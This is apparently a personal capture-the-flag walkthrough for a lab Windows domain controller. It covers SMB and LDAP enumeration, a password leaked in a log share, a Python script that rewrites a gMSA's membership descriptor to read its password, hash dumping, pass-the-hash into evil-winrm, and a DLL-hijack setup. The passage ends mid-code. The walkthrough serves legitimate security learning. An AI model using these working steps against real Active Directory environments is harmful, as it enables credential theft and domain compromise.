<!-- markdownlint-disable MD013 -->

![logging.png](logging.png)

# Logging

## Enum

```bash
nmap -Pn -sC -sV 10.129.35.59 -oN scans/initial.nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 19:39 +0100
Nmap scan report for 10.129.35.59
Host is up (0.048s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 01:47:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
|_ssl-date: 2026-04-20T01:47:53+00:00; +7h07m17s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
|_ssl-date: 2026-04-20T01:47:52+00:00; +7h07m16s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
|_ssl-date: 2026-04-20T01:47:53+00:00; +7h07m17s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-20T01:47:52+00:00; +7h07m16s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-04-20T01:47:44
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h07m16s, deviation: 0s, median: 7h07m15s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.97 seconds
```

```bash
echo 'wallace.everette' >> ./tools/usernames.txt
echo 'We**********' >> ./tools/passwords.txt
```

## SMB Enumeration

```bash
nxc smb 10.129.35.59 -u ./tools/usernames.txt -p ./tools/passwords.txt --continue-on-success
[*] Adding missing option 'ignore_opsec' in config section 'nxc' to nxc.conf
[*] Creating missing folder protocols
SMB         10.129.35.59    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.35.59    445    DC01             [+] logging.htb\wallace.everette:We**********
```

```bash
nxc smb 10.129.35.59 -u ./tools/usernames.txt -p ./tools/passwords.txt --shares
SMB         10.129.35.59    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.35.59    445    DC01             [+] logging.htb\wallace.everette:We**********
SMB         10.129.35.59    445    DC01             [*] Enumerated shares
SMB         10.129.35.59    445    DC01             Share           Permissions     Remark
SMB         10.129.35.59    445    DC01             -----           -----------     ------
SMB         10.129.35.59    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.35.59    445    DC01             C$                              Default share
SMB         10.129.35.59    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.35.59    445    DC01             Logs            READ
SMB         10.129.35.59    445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.35.59    445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.35.59    445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

## Credential Exposure in Log files

```bash
smbclient -U 'wallace.everette%We**********' //10.129.35.59/Logs
lpcfg_do_global_parameter: WARNING: The "client lanman auth" option is deprecated
Try "help" to get a list of possible commands.
smb: \>
```

```bash
smb: \> ls
  .                                   D        0  Fri Apr 17 00:10:09 2026
  ..                                  D        0  Fri Apr 17 00:10:09 2026
  Audit_Heartbeat.log                 A     1294  Fri Apr 17 00:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Fri Apr 17 00:10:09 2026
  Service_State.log                   A      468  Fri Apr 17 00:10:09 2026
  TaskMonitor.log                     A     1170  Fri Apr 17 00:10:09 2026

  6657279 blocks of size 4096. 1034926 blocks available
```

```bash
smb: \> mget *
Get file Audit_Heartbeat.log? y
getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
Get file IdentitySync_Trace_20260219.log? y
getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (30.9 KiloBytes/sec) (average 16.6 KiloBytes/sec)
Get file Service_State.log? y
getting file \Service_State.log of size 468 as Service_State.log (2.3 KiloBytes/sec) (average 13.0 KiloBytes/sec)
Get file TaskMonitor.log? y
getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (5.6 KiloBytes/sec) (average 11.4 KiloBytes/sec)
```

```bash
file ./*
./Audit_Heartbeat.log:             ASCII text, with CRLF line terminators
./IdentitySync_Trace_20260219.log: ASCII text, with CRLF line terminators
./Service_State.log:               ASCII text, with CRLF line terminators
./TaskMonitor.log:                 ASCII text, with CRLF line terminators
```

```bash
gitleaks detect --no-git ./*

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

8:02PM INF scanned ~11420 bytes (11.42 KB) in 40.3ms
8:02PM INF no leaks found
```

```bash
grep -i 'pass' ./*
./IdentitySync_Trace_20260219.log:[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3***************, Timeout: 30 }
```

```bash
echo 'LOGGING\svc_recovery' >> ./tools/usernames.txt
echo 'Em***************' >> ./tools/passwords.txt
```

```bash
sudo ntpdate logging
```

```bash
getTGT.py 'LOGGING/svc_recovery:Em3***************
zsh: /home/blnkn/.local/bin/getTGT.py: bad interpreter: /home/blnkn/.local/pipx/venvs/impacket/bin/python: no such file or directory
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_recovery.ccache
```

```bash
echo 'Em3*************** >> ./tools/passwords.txt
```

```bash
export KRB5CCNAME=~/sec/htb/machines/logging/tools/svc_recovery.ccache
```

```bash
klist
Ticket cache: FILE:/home/blnkn/sec/htb/machines/logging/tools/svc_recovery.ccache
Default principal: svc_recovery@LOGGING.HTB

Valid starting       Expires              Service principal
04/20/2026 03:25:11  04/20/2026 07:25:11  krbtgt/LOGGING@LOGGING.HTB
 renew until 04/20/2026 07:25:11
```

## LDAP Enumeration

```bash
nxc ldap 10.129.35.59 -u ./tools/usernames.txt -p ./tools/passwords.txt --continue-on-success
[*] Initializing LDAP protocol database
SMB         10.129.35.59    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
LDAP        10.129.35.59    389    DC01             [+] logging.htb\wallace.everette:We**********
```

```bash
INFO  - Establishing SQL session with HR01.logging.htb...
TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
```

Note to self, you're better off always using the official extraction tools, you lost a lot of time here with incomplete information

```bash
nxc ldap 10.129.35.59 -d logging.htb --dns-server 10.129.35.59 -u svc_recovery -p 'Em3*************** -k --bloodhound
SMB         10.129.35.59    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
LDAP        10.129.35.59    389    DC01             [+] logging.htb\svc_recovery:Em3**************
LDAP        10.129.35.59    389    DC01             Resolved collection methods: localadmin, session, group, trusts
LDAP        10.129.35.59    389    DC01             Using kerberos auth without ccache, getting TGT
LDAP        10.129.35.59    389    DC01             Done in 00M 08S
LDAP        10.129.35.59    389    DC01             Compressing output into /home/blnkn/.nxc/logs/DC01_10.129.35.59_2026-04-20_042923_bloodhound.zip
```

```bash
(venv) [blnkn@arch](main =):/opt/bloodyAD% bloodyAD -k \
  -u 'svc_recovery' \
  -p 'Em3*************** \
  --dc-ip 10.129.35.59 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get dnsDump | grep -v recordName | sort -u

A: 10.129.35.59
CNAME: dc01.logging.htb
NS: dc01.logging.htb
SOA.PrimaryServer: dc01.logging.htb
SOA.zoneAdminEmail: hostmaster@logging.htb
SRV: dc01.logging.htb:3268
SRV: dc01.logging.htb:389
SRV: dc01.logging.htb:464
SRV: dc01.logging.htb:88
zoneName: logging.htb
```

```bash
grep -i 3268 /etc/services
msft-gc          3268/tcp
msft-gc          3268/udp
```

```bash
nc -vz logging 3268
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.35.59:3268.
Ncat: 0 bytes sent, 0 bytes received in 0.06 seconds.
```

```bash
bloodyAD -k \
  -u 'svc_recovery' \
  -p 'Em3*************** \
  --dc-ip 10.129.35.59 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get search \
    --filter "(primaryGroupID=516)"\
    --attr sAMAccountName

distinguishedName: CN=DC01,OU=Domain Controllers,DC=logging,DC=htb
sAMAccountName: DC01$
```

```bash
bloodyAD -k \
  -u 'svc_recovery' \
  -p 'Em3*************** \
  --dc-ip 10.129.35.59 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get search \
    --filter "(primaryGroupID=515)" \
    --attr sAMAccountName

distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
sAMAccountName: msa_health$
```

```bash
bloodyAD -k \
  -u 'svc_recovery' \
  -p 'Em3*************** \
  --dc-ip 10.129.35.59 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get search \
    --filter "(primaryGroupID=513)"\
    --attr sAMAccountName | grep sAMA
sAMAccountName: Administrator
sAMAccountName: krbtgt
sAMAccountName: svc_recovery
sAMAccountName: jaylee.clifton
sAMAccountName: monique.chip
sAMAccountName: kyson.abel
sAMAccountName: fable.milford
sAMAccountName: wellington.kylan
sAMAccountName: serina.philander
sAMAccountName: wallace.everette
sAMAccountName: toby.brynleigh
```

```bash
bloodyAD -k \
  -u 'svc_recovery' \
  -p 'Em3*************** \
  --dc-ip 10.129.35.59 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get object svc_recovery --attr allowedChildClasses
distinguishedName: CN=svc_recovery,CN=Users,DC=logging,DC=htb
allowedChildClasses: ms-net-ieee-80211-GroupPolicy; nTFRSSubscriptions; classStore; ms-net-ieee-8023-GroupPolicy
```

```bash
bloodyAD -k \
  -u 'svc_recovery' \
  -p 'Em3*************** \
  --dc-ip 10.129.35.59 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  shadowCredentials svc_recovery
```

## Learning About DCOM

1. Remote DCOM Activation Rights
By default, members of the Performance Log Users group have the right to remotely
activate certain DCOM objects. As we discussed with SilverPotato, the exploit relies
on triggering a DCOM call to a specific Service (like CertSrv for AD CS). If an attacker
can compromise a user who is part of this group, they have a "legal" way to talk to the
DCOM components needed to start the exploit.

2. The "Sceduler" and "Task" Triggers
Many "Potato" exploits (like JuicyPotatoNG or PrintPotato) rely on triggering a system
service to authenticate against a fake listener. Performance Log Users have the
permissions to start/stop certain performance counters and diagnostic logs. These
actions often trigger high-privileged services (running as SYSTEM or NetworkService)
to perform checks, which the attacker then intercepts.

3. Bypassing Restrictions
In highly hardened environments, "Domain Users" might be blocked from remote RPC calls.
However, administrators often forget to strip these rights from Performance Log Users
because it's a built-in Windows group used for monitoring tools. This makes it a
"blind spot" for defenders and a "green light" for SilverPotato.

## Learning About Potatoes
```txt
RottenPotato    BITS Service          The original proof of concept using the BITS service.
JuicyPotato     DCOM / CLSIDs         Expanded the attack to use hundreds of different Windows "objects" to trigger the auth.
PrintPotato     Print Spooler         Leveraged the Windows Print Spooler service to coerce authentication.
RoguePotato     Fake OXID Resolver    Created after Microsoft patched the way DCOM handled local resolvers.
SilverPotato    AD CS / DCOM          The variant we discussed earlier, specifically targeting Certificate Services.
```

- [jlajara - potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- [hideansec - potatoes](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)

- ADCSCoercePotato
- DISTRIBUTED COM <USERS@LOGGING.HTB>
- PERFORMANCE LOG <USERS@LOGGING.HTB>

```bash
coercer scan -u 'svc_recovery' -p 'Em3*************** --target 10.129.35.59
```

```bash
python bloodhound.py \
  -ns 10.129.35.59 \
  -dc dc01.logging.htb \
  -d logging.htb \
  -u svc_recovery \
  -p 'Em3*************** \
  -no-pass \
  --zip \
  -c All \
  -k
```

## Attacking GMSA (Group Managed Service Accounts)

- [attacking gmsa](https://medium.com/@offsecdeer/attacking-group-managed-service-accounts-gmsa-5e9c54c56e49)

```bash
python3 bloodyAD.py ... get search 'DC=logging,DC=htb' '(objectClass=msDS-GroupManagedServiceAccount)'
```

RID Group Name Target Type
513 Domain Users Standard user accounts.
515 Domain Computers Standard workstations and member servers.
516 Domain Controllers The "crown jewels" (DCs).

```bash
cat /etc/krb5.conf
[libdefaults]
    default_realm = LOGGING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    LOGGING.HTB = {
        kdc = logging.htb
        admin_server = logging.htb
    }

[domain_realm]
    .logging.htb = LOGGING.HTB
    logging.htb = LOGGING.HTB
```

```bash
sudo pacman -S cyrus-sasl-gssapi
```

logging in as `svc_recovery`

```bash
kinit svc_recovery@LOGGING.HTB
```

```bash
ldapsearch -H ldap://10.129.39.50:389 \
  -Y GSSAPI \
  -b 'DC=logging,DC=htb'
```

**msDS-GroupMSAMembership** is a list users or groups authorized to read the **GMSA** password
stored in the form of a raw binary **Windows Security Descriptor (DACL+SACL)**.

- **DACL**: Discretionary Access Control List
  Defines who has access to an object (like a file, user, or active directory object).
  Contains specific rules stating which users or groups are Allowed or Denied read,
  write, or execute permissions.

- **SACL**: System Access Control List
  Defines what gets audited or logged. Tells the Domain Controller to generate a log
  event in the Windows Event Viewer when a specific user successfully accesses or fails
  to access an object.

It is an attribute stored on the GMSA account itself

We can read some of the GMSA account details but not the
msDS-GroupMSAMembership. That's how it should be by default.

```bash
ldapsearch -H ldap://10.129.39.50:389 \
  -Y GSSAPI \
  -b 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb' \
  -s base \
  '(objectClass=*)' \
  sAMAccountName msDS-GroupMSAMembership '+'
```

But we have **GenericWrite** nevertheless. So we should be able to
overwrite the attribute

Just like with ldapsearch, NTLM bind doesn't work

```python
import ldap3

server = ldap3.Server("10.129.39.50:389")
client = ldap3.Connection(
    server,
    user="logging.htb\\svc_recovery",
    password="Em3***************,
    authentication=ldap3.NTLM,
    auto_bind=True,
)
```

So we're using Kerberos instead

```python
pip install gssapi
```

```python
import ldap3

server = ldap3.Server("10.129.39.50", port=389)
client = ldap3.Connection(
    server,
    authentication=ldap3.SASL,
    sasl_mechanism="GSSAPI",
    auto_bind=True,
)
```

Ok so we're **svc_recovery**, we have **GenericWrite** to **msa_health** which is a
**GMSA**. So we'll try to overwrite the **msDS-GroupMSAMembership** of **msa_health**
to make **wallace.everette** a member, which should allow him to read the password
of the **GMSA**.

First let's get **Wallace**'s **SID**.

```bash
ldapsearch -H ldap://10.129.39.50:389 \
  -Y GSSAPI \
  -b 'DC=logging,DC=htb' \
  '(sAMAccountName=wallace.everette)' \
  objectSid
```

```txt
SASL/GSSAPI authentication started
SASL username: svc_recovery@LOGGING.HTB
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <DC=logging,DC=htb> with scope subtree
# filter: (sAMAccountName=wallace.everette)
# requesting: objectSid
#

# wallace.everette, Users, logging.htb
dn: CN=wallace.everette,CN=Users,DC=logging,DC=htb
objectSid:: AQUAAAAAAAUVAAAAB+eo71Gnr6a44kNkPwgAAA==

# search reference
ref: ldap://ForestDnsZones.logging.htb/DC=ForestDnsZones,DC=logging,DC=htb

# search reference
ref: ldap://DomainDnsZones.logging.htb/DC=DomainDnsZones,DC=logging,DC=htb

# search reference
ref: ldap://logging.htb/CN=Configuration,DC=logging,DC=htb

# search result
search: 4
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

Ok well. ldapsearch will give us the raw data as it is stored in LDAP,
and it is a SID in binary form, and base64 encoded. Here's how to decode that into
its canonical form with impacket.

```python

import base64
from impacket.ldap.ldaptypes import LDAP_SID

# Decode the b64 into raw binary
binary_form = base64.b64decode("AQUAAAAAAAUVAAAAB+eo71Gnr6a44kNkPwgAAA==")

# load the binary into an impacket LDAP_SID object
sid = LDAP_SID(data=binary_form)

# Print the canonical, human-readable SID string
print(f"[*] Decoded SID: {sid.formatCanonical()}")
```

Or it would have been a lot easier to just use Active directory aware tools
But where's the fun in that.

```bash
bloodyAD -k \
  -u 'svc_recovery' \
  -p 'Em3*************** \
  --dc-ip 10.129.39.50 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get object 'wallace.everette' --attr objectSid
```

```txt
distinguishedName: CN=wallace.everette,CN=Users,DC=logging,DC=htb
objectSid: S-1-5-21-4020823815-2796529489-1682170552-2111
```

Rebuild the gmsa group membership object from scratch

```python
import json
import ldap3
from impacket.ldap import ldaptypes

server = ldap3.Server("10.129.39.50:389")
client = ldap3.Connection(
    server,
    authentication=ldap3.SASL,
    sasl_mechanism="GSSAPI",
    auto_bind=True,
)

# wallace.everette's SID
sid = "S-1-5-21-4020823815-2796529489-1682170552-2111"

# This builds the payload of the rule.
# An Access Allowed Access Controll Entry
aaace = ldaptypes.ACCESS_ALLOWED_ACE()
# The Magic Number (983551):
# This integer represents binary bit-flags mapping to specific
# Active Directory permissions.
# In Windows,this evaluates to Full Control
# (combining read, write, create child, and extended rights).
aaace["Mask"] = ldaptypes.ACCESS_MASK()
aaace["Mask"]["Mask"] = 983551
# The Target: It converts Wallace's string SID into the binary
# format Active Directory requires.
aaace["Sid"] = ldaptypes.LDAP_SID()
aaace["Sid"].fromCanonical(sid)

# Access Control Entry (the specific rule inside the list).
ace = ldaptypes.ACE()
# ACCESS_ALLOWED_ACE_TYPE rule
ace["AceType"] = 0
# will not be inherited by sub-folders
ace["AceFlags"] = 0
ace["Ace"] = aaace

# Start to build the DACL
dacl = ldaptypes.ACL()
# maps to standard modern Windows security headers.
dacl["AclRevision"] = 4
# internal "padding" bytes defined by Microsoft that must be set to 0.
dacl["Sbz1"] = 0
dacl["Sbz2"] = 0
dacl.aces = [ace]

# Start to build the SD
sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
# Revision and 0 padding
sd["Revision"] = b"\x01"
sd["Sbz1"] = b"\x00"
# This flag sets a binary bitmask telling Windows that this DACL is Auto-Inherited
# and should protect itself from being overwritten by folder templates
sd["Control"] = 32772
# Sets the highly privileged "NT AUTHORITY\SYSTEM" account
# as the physical ownerof the security descriptor.
# (the safest default to avoid locking everyone out).
sd["OwnerSid"] = ldaptypes.LDAP_SID()
sd["OwnerSid"].fromCanonical("S-1-5-18")
sd["GroupSid"] = b""
# Map our DACL into the object's DACL slot,
sd["Dacl"] = dacl
# leaving the auditing list slot (SACL) completely blank.
sd["Sacl"] = b""

# And finally we'll replace msDS-GroupMSAMembership with our crafted object
client.modify(
    "CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb",
    {
        "msDS-GroupMSAMembership": [
            (
                ldap3.MODIFY_REPLACE,
                [
                    sd.getData(),
                ],
            ),
        ],
    },
)
print(json.dumps(client.result, indent=2))
```

Boom

```bash
python grant_gmsa_read.py
```

```json
{
  "result": 0,
  "description": "success",
  "dn": "",
  "message": "",
  "referrals": null,
  "type": "modifyResponse"
}
```

Wallace can see the msDS-GroupMSAMembership now

```bash
bloodyAD -k \
  -u 'wallace.everette' \
  -p 'We**********' \
  --dc-ip 10.129.39.50 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get object 'msa_health$' --attr msDS-GroupMSAMembership


distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
msDS-GroupMSAMembership: O:S-1-5-18D:(A;;0xf01ff;;;S-1-5-21-4020823815-2796529489-1682170552-2111)
```

Maybe we could learn how to fully decode it with impacket? But in any case we can see
Wallace's SID in there already and what we really care about is the actual
password itself, it should be under **msDS-ManagedPassword**

BloodyAd gives me an error but there's data here apparently

```bash
bloodyAD -k \
  -u 'wallace.everette' \
  -p 'We**********' \
  --dc-ip 10.129.39.50 \
  --host DC01.logging.htb \
  -d "logging.htb" \
  get object 'msa_health$' --attr msDS-ManagedPassword
```

```python
struct.error: ('unpack requires a buffer of 8 bytes', "When unpacking field 'UnchangedPasswordInterval | <Q | b''[:8]'")
```

Let me try to get the raw bytes
Now let's log in as wallace

```bash
kinit wallace.everette@LOGGING.HTB
Password for wallace.everette@LOGGING.HTB:
```

```bash
(venv) [blnkn@arch](main =):/opt/bloodyAD% ldapsearch -H ldap://10.129.39.50:389 \
  -Y GSSAPI \
  -b 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb' \
  -s base \
  '(objectClass=*)' \
  sAMAccountName msDS-ManagedPassword '+'
```

```ldif
SASL/GSSAPI authentication started
SASL username: wallace.everette@LOGGING.HTB
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb> with scope baseObject
# filter: (objectClass=*)
# requesting: sAMAccountName msDS-ManagedPassword +
#

# msa_health, Managed Service Accounts, logging.htb
dn: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
sAMAccountName: msa_health$
msDS-ManagedPassword:: AQAAACIBAAAQAAAAEgEaAUUyiVJopcrcnpEZMbhxICpBBQnTIG7wvOO
 gDgEqYBmy3S7C2YVXf+p9/YtpsyKdafZyAIyUFLJh/b4xWTk+k15rgAhEWIS7HJ53+xhmTfBTTcjT
 NvVNSHFu+p85PMoqijJta8lAr9XkpKjINW8pXlb4m2GmVwSpSthrIrWB/szxcAjl1gxRR/nhPSUoc
 n86by495+6X0M2aFuD71fk/EUdCI/g9J2RcoDsnDLfqTNkl2eE4rvlcbrkgW9P38W0SMVftE87cRD
 2QOD+cDOnS/cDbZ57do2ncXiP1pQV+8Xiqh0tNLCZsUlKljLfPSTY5V2pyMA7iRQHA1gOfEDwgDPE
 AAM3JgNYeEAAAzWuwIx4QAAA=

# search result
search: 4
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Mmmmh yea or we can just use the same tools as everybody else,
I'll see later if I have time to dive deeper and experiment with decoding that
stuff myself with impacket, as a thought experiment.

```bash
python3 gMSADumper.py -u 'wallace.everette' -p 'We**********' -d 'logging.htb'
```

```txt
Users or groups who can read password for msa_health$:
 > wallace.everette
msa_health$:::603fc24ee01a9409f83c9d1d701485c5
msa_health$:aes256-cts-hmac-sha1-96:b8dc25e7110a9bc35956fcfbd28da1193fbd597ae60c22297974d0a25437ab23
msa_health$:aes128-cts-hmac-sha1-96:e012abfa4e08998cddb30f332a287010
```

Now what, presumably we could crack those, and or just pass the hash

PTH to get a TGT

```bash
getTGT.py \
  -dc-ip 10.129.39.50 \
  'logging.htb/msa_health$:' \
  -hashes ':603fc24ee01a9409f83c9d1d701485c5'
```

```txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in msa_health$.ccache
```

```bash
export KRB5CCNAME=/home/blnkn/sec/htb/machines/logging/tools/msa_health.ccache
```

Or just winrm directly in the box

```bash
evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

## Further Enumeration as msa health

```powershell
*Evil-WinRM* PS C:\Users\msa_health$\Documents> dir


    Directory: C:\Users\msa_health$\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/17/2026   9:02 AM           1059 monitor.ps1
```

```powershell
<#
.SYNOPSIS
    Monitors the status of the "UpdateChecker Agent" scheduled task.
    Uses COM interface to avoid CIM/WMI permission issues.
#>

$TaskName = "UpdateChecker Agent"
$LogPath = "C:\Share\Logs\TaskMonitor.log"
$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

try {
    $service = New-Object -ComObject "Schedule.Service"
    $service.Connect()
    $task = $service.GetFolder("\").GetTask($TaskName)

    $State = switch ($task.State) {
        1 { "Disabled" }
        2 { "Queued" }
        3 { "Ready" }
        4 { "Running" }
        5 { "Disabled" }
        6 { "Unknown" }
        default { "Unknown" }
    }

    if ($State -ne "Ready" -and $State -ne "Running") {
        $Message = "[$Timestamp] WARN  - Task [$TaskName] is in an unexpected state: $State"
    }
    else {
        $Message = "[$Timestamp] INFO  - Task [$TaskName] health check: OK (State: $State)"
    }
}
catch {
    $Message = "[$Timestamp] ERROR - Failed to query task [$TaskName]. Exception: $($_.Exception.Message)"
}

Add-Content -Path $LogPath -Value $Message
```

As mentionned in the synopsis we can't use the usual tools to list the services because
We don't have access

We don't get that info with powershell

```powershell
*Evil-WinRM* PS C:\Share\Logs> Get-ScheduledTask -TaskName "UpdateChecker Agent"
Cannot connect to CIM server. Access denied
At line:1 char:1
+ Get-ScheduledTask -TaskName "UpdateChecker Agent"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (MSFT_ScheduledTask:String) [Get-ScheduledTask], CimJobException
    + FullyQualifiedErrorId : CimJob_BrokenCimSession,Get-ScheduledTask
```

Nor with schtasks in cmd

```cmd
*Evil-WinRM* PS C:\Share> schtasks /query /tn "UpdateChecker Agent" /fo list /v

Program 'schtasks.exe' failed to run: Access is deniedAt line:1 char:1
+ schtasks /query /tn "UpdateChecker Agent" /fo list /v
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ schtasks /query /tn "UpdateChecker Agent" /fo list /v
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

But we can use the COM interface instead

```powershell
*Evil-WinRM* PS C:\Share> $s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Principal.UserId

jaylee.clifton
```

Update Monitor runs as clifton

```powershell
*Evil-WinRM* PS C:\Share> $s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Actions


Id               :
Type             : 0
Path             : "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
Arguments        : 500 /scan=3 /autofix=true
WorkingDirectory :
HideAppWindow    : False
```

And from here we need to understand what DLLs this thing loads so we can maybe hijack one

So I pulled UpdateMonotor.exe on my machine and decompiled it with ILSpy, here's the main

```powershell
// UpdateMonitor.Program
using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;

private static void Main(string[] args)
{
  string path = "C:\\ProgramData\\UpdateMonitor\\Logs\\monitor.log";
  string text = "C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip";
  string text2 = "C:\\Program Files\\UpdateMonitor\\bin\\";
  string text3 = "settings_update.dll";
  string text4 = Path.Combine(text2, text3);
  Directory.CreateDirectory(Path.GetDirectoryName(path));
  CleanupLogs(path, 90);
  Log(path, "Starting Sentinel Update Check...");
  Log(path, "Checking for update on core server...");
  Log(path, "Info: Core did not find file Settings_Update.zip");
  Log(path, "Last status: File not found on core");
  Log(path, "Checking for update on local server...");
  if (File.Exists(text))
  {
    try
    {
      if (File.Exists(text4))
      {
        File.Delete(text4);
      }
      ZipFile.ExtractToDirectory(text, text2);
      Log(path, "Successfully unzipped update to " + text2);
    }
    catch (IOException ex)
    {
      Log(path, "Update failed: " + ex.Message);
    }
    catch (Exception ex2)
    {
      Log(path, "Update failed: " + ex2.Message);
    }
  }
  else
  {
    Log(path, "No updates found locally: C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip.");
  }
  Log(path, "Loading update applier: " + text4);
  IntPtr intPtr = LoadLibrary(text4);
  if (intPtr == IntPtr.Zero)
  {
    int lastWin32Error = Marshal.GetLastWin32Error();
    Log(path, $"Failed to load {text3}. Error code: {lastWin32Error}");
    Log(path, "Update check completed.");
    return;
  }
  try
  {
    IntPtr procAddress = GetProcAddress(intPtr, "PreUpdateCheck");
    if (procAddress != IntPtr.Zero)
    {
      Log(path, "Calling 'PreUpdateCheck' in " + text3);
      ((PreUpdateCheck)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(PreUpdateCheck)))();
    }
    else
    {
      Log(path, "'PreUpdateCheck' not found in " + text3 + ". Continuing...");
    }
